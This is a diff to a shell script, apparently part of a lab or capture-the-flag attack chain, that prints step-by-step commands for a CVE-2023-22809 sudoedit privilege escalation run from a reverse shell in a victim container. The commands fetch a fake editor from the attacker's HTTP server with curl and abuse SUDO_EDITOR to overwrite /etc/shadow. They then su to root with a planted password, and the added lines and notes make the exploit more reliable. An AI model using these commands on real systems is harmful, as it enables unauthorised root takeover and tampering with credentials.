@@ -35,8 +35,10 @@ cat <<EOF
  CVE-2023-22809 sudoedit bypass — Paste into the git reverse shell
 ════════════════════════════════════════════════════════════════════
 
+rm -f ${REMOTE_EDITOR}
 curl -s -o ${REMOTE_EDITOR} http://${LHOST}:${HTTP_PORT}/fake_editor.sh
 chmod +x ${REMOTE_EDITOR}
+cd /
 SUDO_EDITOR="${REMOTE_EDITOR} -- /etc/shadow" sudoedit /etc/gitlab/trusted.conf
 echo 'pwned123' | su -c '/bin/bash' root
 
@@ -45,6 +47,12 @@ echo 'pwned123' | su -c '/bin/bash' root
 If the exploit succeeds, the last \`su\` line opens a root bash shell
 inside the victim container (uid=0). The root password "pwned123"
 matches the hash our fake editor wrote into /etc/shadow.
+
+Notes on the two extra lines:
+  rm -f ${REMOTE_EDITOR}   → clear any leftover from a prior run (wrong
+                             owner blocks chmod).
+  cd /                     → sudoedit refuses to edit when cwd is
+                             writable by the caller; / is safe.
 
 Press Ctrl+C here to stop the HTTP server when done (PID ${HTTP_PID}).
 EOF
